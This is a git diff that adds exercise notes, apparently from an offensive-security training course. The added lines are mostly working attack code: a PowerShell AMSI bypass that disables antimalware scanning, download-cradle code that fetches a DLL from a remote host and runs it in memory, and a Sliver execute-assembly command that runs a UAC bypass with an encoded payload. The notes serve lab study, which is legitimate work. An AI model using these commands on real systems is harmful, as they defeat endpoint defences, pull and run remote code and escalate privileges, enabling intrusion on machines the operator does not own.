@@ -782,8 +782,30 @@ Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSessi
 
 ### 7.5.2
 
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+$data = (New-Object System.Net.WebClient).DownloadData('url to dll')
+
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("<namespace.class>")
+$method = $class.GetMethod("<method>")
+$method.Invoke(0, $null)
+```
+
 - used sliver to start an implant on the Student instance
 - forked a UAC Bypass implementation on github and added an Amsi Bypass class to it (https://github.com/rogdooley/SharpBypassUAC)
+```shell
+execute-assembly /home/roger/Documents/Tools/SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIGM6XHVzZXJzXE9mZnNlY1xEb3dubG9hZHNcU0hZX1BSRVNTUk9PTS5leGU=
+```
+
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.x/UACBypass.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("UACBypass.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
+```
 
 
 #### 7.6.2 Is That Your Registry Key
